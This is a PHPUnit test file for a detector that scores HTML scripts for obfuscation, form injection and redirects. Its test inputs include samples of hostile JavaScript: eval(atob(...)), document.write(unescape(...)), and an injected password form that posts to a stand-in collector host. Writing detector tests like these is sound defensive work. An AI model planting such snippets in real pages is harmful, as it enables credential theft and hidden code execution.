<?php

declare(strict_types=1);

namespace SafeSurf\Tests;

use PHPUnit\Framework\TestCase;
use SafeSurf\Checks\JsSignals;

final class JsSignalsTest extends TestCase
{
    public function testCleanScriptIsNotSuspicious(): void
    {
        $html = '<html><body><script>document.getElementById("x").textContent = "hi";</script></body></html>';
        $out = JsSignals::analyzeHtml($html);
        $this->assertFalse($out['has_obfuscation']);
        $this->assertFalse($out['has_form_injection']);
        $this->assertLessThan(0.2, $out['suspicious_score']);
    }

    public function testEvalAtobDetected(): void
    {
        $html = '<script>eval(atob("PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="));</script>';
        $out = JsSignals::analyzeHtml($html);
        $this->assertTrue($out['has_eval_atob']);
        $this->assertTrue($out['has_obfuscation']);
    }

    public function testDocumentWriteUnescapeDetected(): void
    {
        $html = '<script>document.write(unescape("%3Cscript%3E"));</script>';
        $out = JsSignals::analyzeHtml($html);
        $this->assertTrue($out['has_obfuscation']);
    }

    public function testFormInjectionDetected(): void
    {
        $html = <<<'HTML'
        <script>
        document.write('<form action="http://collector.example.net"><input type="password" name="pw"></form>');
        </script>
        HTML;
        $out = JsSignals::analyzeHtml($html);
        $this->assertTrue($out['has_form_injection']);
    }

    public function testHardRedirectDetected(): void
    {
        $html = '<script>window.location = "https://other.example.org/next";</script>';
        $out = JsSignals::analyzeHtml($html);
        $this->assertTrue($out['has_js_redirect']);
    }

    public function testEmptyHtmlYieldsZeroSignals(): void
    {
        $out = JsSignals::analyzeHtml('');
        $this->assertSame(0, $out['script_count']);
        $this->assertFalse($out['has_obfuscation']);
    }
}
